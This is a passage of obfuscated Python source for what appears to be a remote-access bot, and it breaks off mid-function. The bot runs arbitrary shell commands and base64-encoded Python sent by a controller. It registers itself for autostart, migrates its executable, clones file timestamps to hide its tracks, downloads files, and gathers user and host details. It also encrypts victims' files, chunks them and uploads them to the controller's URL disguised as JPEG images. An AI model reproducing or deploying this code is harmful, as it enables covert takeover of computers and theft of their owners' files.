			return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy


	def upload_file(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDi):
		for i in range(3):
			with open(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDi,'rb')as fl:
				try:
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDyz=os_fstat(fl.fileno()).st_size
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzi=HttpFormatKlass()
					encoded_cookie_data=self.__encode_cookie({'id':botKlass.bot_id,'action':'upload'})
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzi.add_file(str('image'),str(id_generator()+'.jpg'),fl)
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie={}
					if botKlass.current_transport=='wininet':
						http_klass=HttpKlass(self.url,self.user_agent)
						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=http_klass.post_form(encoded_cookie_data,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzi)
						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.decode_data(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie)
					else:
						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDei=str(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzi)
						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDez=urllib2_request(str(self.url))
						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDez.add_header('User-agent',self.user_agent)
						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDez.add_header('Cookie',encoded_cookie_data)
						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDez.add_header('Content-type',pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzi.get_content_type())
						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDez.add_header('Content-length',len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDei))
						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDez.add_data(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDei)
						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=urllib2_urlopen(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDez).read()
						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.decode_data(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie)
					if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie.get('result','')!='ok' or pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie.get('size',0)!=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDyz:
						raise ValueError
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['url']=self.url
					return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie
				except ExceptionKlass:
					time_sleep(random_randint(3,8))
					continue


	def get_ip(self):
		for i in range(3):
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.__send_request(id=botKlass.bot_id,action='getip')
			try:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.decode_data(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie)
				return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['ip']
			except ExceptionKlass:
				time_sleep(random_randint(3,8))
				continue
			except Exception as e:
				pass
			return None


class ArgParserKlass(argparse_argumentparser):
	def parse_string(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy):
		if not pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy:
			raise ValueError(self.format_help())
		return self.parse_args(shlex_split(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy.replace('\\','\\\\')))
	def error(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyiQ):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDey='error: {0}\n{1}\n'.format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyiQ,self.format_help())
		raise ValueError(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDey)


class HandleCommandKlass(object):

	@staticmethod
	def parse_command(data):
		arg1=None
		arg2=None
		try:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDzey=data.strip().split(' ',1)
			arg1=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDzey[0].strip().lower()
			if len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDzey)>1:
				arg2=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDzey[1].strip(' ')
		except Exception as err:
			pass
		return arg1,arg2


	@staticmethod
	def invoke_command(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDzei=0x00000008
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDziy=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('wait',True)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDzie=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('visible',False)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDyze=None
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDyzi=None
		if v_sys_platform=='win32':
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDyzi=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDzei
			if not pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDzie:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDyze=v_startup_info
		if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDziy:
			p=subprocess_popen(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy,shell=True,stderr=subprocess_pipe,stdout=subprocess_pipe,stdin=subprocess_pipe,startupinfo=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDyze)
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDyez,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDyei=p.communicate()
			v_return_message=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDyez+'\n'+pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDyei
		else:
			p=subprocess_popen(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy,shell=False,stderr=None,stdout=None,stdin=None,close_fds=True,creationflags=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDyzi,startupinfo=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDyze)
			v_return_message="Process started with PID: {0}".format(p.pid)
		return v_return_message


	@staticmethod
	def change_dir(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy=os_path.abspath(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy)
		if not os_path.exists(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy):
			return False
		else:
			botKlass.current_dir=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy
			return True


	def __special_process(self,v_bot_command,v_optional):
		pass
		v_return_message='No output returned'
		if v_bot_command=='autoload':
			argParserKlass=ArgParserKlass(prog=':autoload',add_help=False)
			argParserKlass.add_argument('command',choices=['register','info'])
			argParserKlass.add_argument('--app-name',dest='app_name',default=botKlass.autoload_settings['app_name'])
			argParserKlass.add_argument('--exe-name',dest='exe_name',default=botKlass.autoload_settings['exe_name'])
			argParserKlass.add_argument('--exe-path',dest='exe_path',default=None)
			argParserKlass.add_argument('--force',action='store_true')
			try:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize=argParserKlass.parse_string(v_optional)
			except Exception as e:
				v_return_message="{0}".format(e)
				return v_return_message
			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.exe_path:
				if not os_path.exists(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.exe_path):
					return 'No such file: {0}'.format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.exe_path)
			botActionKlass=BotSelfActionsKlass(app_name=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.app_name,exe_name=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.exe_name,exe_path=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.exe_path)
			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.command=='register':
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=botActionKlass.register(force=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.force)
				v_return_message=json_dumps(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie)if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie else 'Unhandled exception'
				return v_return_message
			elif pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.command=='info':
				v_return_message=botActionKlass.format_info()
				return v_return_message
			else:
				v_return_message=argParserKlass.format_help()
				return v_return_message
		elif v_bot_command=='migrate':
			argParserKlass=ArgParserKlass(prog=':migrate',add_help=False)
			argParserKlass.add_argument('exe_path')
			try:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize=argParserKlass.parse_string(v_optional)
			except Exception as e:
				v_return_message="{0}".format(e)
				return v_return_message
			if not os_path.exists(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.exe_path):
				return 'No such file: {0}'.format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.exe_path)
			try:
				botActionKlass=BotSelfActionsKlass()
				botActionKlass.self_migrate(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.exe_path)
				v_return_message='Migrate completed'
				return v_return_message
			except Exception as e:
				v_return_message="Error: {0}".format(e)
				return v_return_message
		elif v_bot_command=='clone_time':
			argParserKlass=ArgParserKlass(prog=':clone_time',add_help=False)
			argParserKlass.add_argument('src_path')
			argParserKlass.add_argument('dst_path')
			try:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize=argParserKlass.parse_string(v_optional)
			except Exception as e:
				v_return_message="{0}".format(e)
				return v_return_message
			if not os_path.exists(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.src_path):
				return 'No such file: {0}'.format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.src_path)
			if not os_path.exists(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.dst_path):
				return 'No such file: {0}'.format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.dst_path)
			try:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=BotActionsKlass.clone_file_times(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.src_path,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.dst_path)
				v_return_message='Time cloned'
				return v_return_message
			except Exception as e:
				v_return_message="Error: {0}".format(e)
				return v_return_message
		elif v_bot_command=='download':
			argParserKlass=ArgParserKlass(prog=':download',add_help=False)
			argParserKlass.add_argument('url')
			argParserKlass.add_argument('file_name')
			try:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize=argParserKlass.parse_string(v_optional)
			except Exception as e:
				v_return_message="{0}".format(e)
				return v_return_message
			try:
				urllib_urlretrieve(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.url,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.file_name)
				v_return_message='File saved to {0}'.format(os_path.abspath(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.file_name))
				return v_return_message
			except Exception as e:
				v_return_message="Error: {0}".format(e)
				return v_return_message
		elif v_bot_command=='execw':
			argParserKlass=ArgParserKlass(prog=':execw',add_help=False)
			argParserKlass.add_argument('command')
			argParserKlass.add_argument('--visible',action='store_true')
			try:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize=argParserKlass.parse_string(v_optional)
			except Exception as e:
				v_return_message="{0}".format(e)
				return v_return_message
			v_return_message=self.invoke_command(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.command,wait=False,visible=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.visible)
			return v_return_message
		elif v_bot_command=='get':
			argParserKlass=ArgParserKlass(prog=':get',add_help=False)
			argParserKlass.add_argument('file_path')
			try:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize=argParserKlass.parse_string(v_optional)
			except Exception as e:
				v_return_message="{0}".format(e)
				return v_return_message
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDeyi=os_path.basename(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.file_path)
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDeiz=[]
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDeiy=0
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDizy=id_generator(size=16,chars=string_ascii_letters)
			out_filename=CryptoKlass.encrypt_file(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDizy,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.file_path)
			with open(out_filename,'rb')as fl:
				while True:
					with tempfile_namedtemporaryfile(delete=False)as tmp_file:
						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy=fl.read(1024*1024)
						if not pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy:
							break
						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDzy=binascii_crc32(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy)&0xffffff
						tmp_file.write(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy)
						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDeiz.append({'file_path':os_path.abspath(tmp_file.name),'size':len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy),'num':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDeiy,'crc':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDzy})
						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDeiy+=1
			try:
				os_remove(out_filename)
			except:
				pass
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQieyD=6
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDiye=[]
			try:
				for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQye in pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDeiz:
					for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDiez in range(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQieyD):
						time_sleep(random_randint(3,8))
						try:
							networkHandleKlass=NetworkHandlerKlass()
							pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyez=networkHandleKlass.upload_file(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQye['file_path'])
							pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDiye.append({'file_name':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyez['filename'],'size':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQye['size'],'num':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQye['num'],'url':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyez['url'],'crc':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQye['crc']})
							break
						except Exception as e:
							if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDiez==pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQieyD-1:
								os_remove(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQye['file_path'])
								raise Exception(e)
							time_sleep(5)
					os_remove(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQye['file_path'])
			except Exception as e:
				v_return_message={'status':'error','data':'Error: {0}'.format(e)}
				return v_return_message
			if len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDiye)==len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDeiz):
				v_return_message={'status':'ok','command':v_dl,'data':{'files':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDiye,'orig_name':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDeyi,'key':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDizy}}
			else:
				v_return_message={'status':'error','data':'not all chunks uploaded'}
			return v_return_message
		elif v_bot_command=='upload_to':
			argParserKlass=ArgParserKlass(prog=':upload_to',add_help=False)
			argParserKlass.add_argument('url')
			argParserKlass.add_argument('file_path')
			try:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize=argParserKlass.parse_string(v_optional)
			except Exception as e:
				v_return_message="{0}".format(e)
				return v_return_message
			try:
				networkHandleKlass=NetworkHandlerKlass(url=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.url)
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyez=networkHandleKlass.upload_file(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.file_path)
				v_return_message='File uploaded, file name: {0}'.format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyez['filename'])
				return v_return_message
			except Exception as e:
				v_return_message="{0}".format(e)
				return v_return_message
		elif v_bot_command=='b64encode':
			argParserKlass=ArgParserKlass(prog=':b64encode',add_help=False)
			argParserKlass.add_argument('file_path')
			try:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize=argParserKlass.parse_string(v_optional)
			except Exception as e:
				v_return_message="{0}".format(e)
				return v_return_message
			try:
				with open(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.file_path,'rb')as fl:
					v_return_message=base64_b64encode(fl.read())
					return v_return_message
			except Exception as e:
				v_return_message="{0}".format(e)
				return v_return_message
		elif v_bot_command=='eval':
			argParserKlass=ArgParserKlass(prog=':eval',add_help=False)
			argParserKlass.add_argument('data')
			try:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize=argParserKlass.parse_string(v_optional)
			except Exception as e:
				v_return_message="{0}".format(e)
				return v_return_message
			try:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie={}
				exec(base64_b64decode(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.data))in pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie
				return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie.get('output','No value in \'output\'')
			except Exception as e:
				v_return_message="{0}".format(e)
				return v_return_message
		elif v_bot_command=='set_update_interval':
			argParserKlass=ArgParserKlass(prog=':set_update_interval',add_help=False)
			argParserKlass.add_argument('start',type=int)
			argParserKlass.add_argument('end',type=int)
			argParserKlass.add_argument('--no-tick-count',dest='tick_count',action='store_false',default=True)
			try:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize=argParserKlass.parse_string(v_optional)
			except Exception as e:
				v_return_message="{0}".format(e)
				return v_return_message
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=botKlass.set_update_interval(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.start,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.end)
			v_return_message='Update interval setted in range: from {0} to {1} seconds'.format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie[0],pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie[1])
			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize.tick_count:
				botKlass.set_tick_count_enabled(True)
				v_return_message+='\n Tick count enabled'
			else:
				botKlass.set_tick_count_enabled(False)
				v_return_message+='\n Tick count disabled'
			return v_return_message
		elif v_bot_command=='self_exit':
			if v_optional!='YESIAMSURE':
				v_return_message='To exit write :self_exit YESIAMSURE'
				return v_return_message
			else:
				thread_interrupt_main()
		elif v_bot_command=='seppuku':
			if v_optional!='YESIAMSURE':
				v_return_message='To perform seppuku write :seppuku YESIAMSURE'
				return v_return_message
			else:
				botActionKlass=BotSelfActionsKlass()
				botActionKlass.seppuku()
		else:
			return 'Not implemented'


	def process(self,command):
		v_bot_command,v_optional=self.parse_command(command)
		pass
		if v_bot_command=='cd':
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.change_dir(v_optional)
			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie:
				v_return_message="Directory changed to: "+botKlass.current_dir
			else:
				v_return_message="No such directory: "+v_optional
		elif v_bot_command=='pwd':
			v_return_message=botKlass.current_dir
		elif v_bot_command=='cdt':
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyeQ=tempfile_gettempdir()
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.change_dir(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyeQ)
			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie:
				v_return_message="Directory changed to: "+botKlass.current_dir
			else:
				v_return_message="Cannot change directory to: "+pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyeQ
		elif v_bot_command[0]==':':
			v_return_message=self.__special_process(v_bot_command[1:],v_optional)
		else:
			v_return_message=self.invoke_command(command)
		return v_return_message


class BotGetInfoKlass(object):

	def collect_info(self):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=dict()
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['bot_id']=botKlass.bot_id
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['key_id']=botKlass.key_id
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['update_interval']=botKlass.update_interval
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['tick_count']=botKlass.tick_count
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['tick_count_enabled']=botKlass.tick_count_enabled
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['enable_autoload']=botKlass.enable_autoload
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['autoload_registered']=botKlass.autoload_registered
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['autoload_settings']=botKlass.autoload_settings
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['host_scripts']=botKlass.host_scripts
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['settings_file_path']=botKlass.settings_file_path
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['current_host']=botKlass.current_host
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['current_transport']=botKlass.current_transport
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['user_agent']=botKlass.user_agent
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['bot_settings']=json_dumps(botKlass.get_all_settings())
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['user_name']=getpass_getuser()
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['host_name']=sys_platform_node()
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['pid']=os_getpid()
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['platform']=sys_platform
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['platform_full']=sys_platform_platform()
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['platform_version']=sys_platform_version()
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['platform_release']=sys_platform_release()
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['platform_arch']=sys_platform_architecture()[0]
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['platform_cpu']=sys_platform_processor()
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['bot_version']=v_bot_version
		try:
